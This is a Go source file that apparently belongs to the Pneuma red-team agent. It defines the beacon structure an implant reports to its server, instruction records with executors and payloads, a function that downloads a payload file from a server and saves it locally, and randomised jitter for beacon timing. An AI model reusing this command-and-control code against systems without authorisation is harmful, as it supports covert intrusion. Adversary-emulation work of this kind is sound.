package sockets

import (
	"bytes"
	"log"
	"math/rand"
	"path/filepath"
	"time"

	"github.com/preludeorg/pneuma/util"
)

//Contact defines required functions for communicating with the server
type Contact interface {
	Communicate(address string, sleep int, beacon Beacon)
}

//CommunicationChannels contains the contact implementations
var CommunicationChannels = map[string]Contact{}

type Beacon struct {
	Name string
	Location string
	Platform string
	Executors []string
	Range string
	Pwd string
	Links []Instruction
}

type Instruction struct {
	ID string `json:"ID"`
	Executor string `json:"Executor"`
	Payload string `json:"Payload"`
	Request string `json:"Request"`
	Response string
	Status int
	Pid int
}

func requestPayload(target string) {
	var body []byte
	var filename string

	body, filename, _ = requestHTTPPayload(target)
	workingDir := "./"
	path := filepath.Join(workingDir, filename)
	util.SaveFile(bytes.NewReader(body), path)
}


func jitterSleep(sleep int, beaconType string) {
	rand.Seed(time.Now().UnixNano())
	min := int(float64(sleep) * .90)
	max := int(float64(sleep) * 1.10)
	randomSleep := rand.Intn(max - min + 1) + min
	log.Printf("[%s] Next beacon going out in %d seconds", beaconType, randomSleep)
	time.Sleep(time.Duration(randomSleep) * time.Second)
}
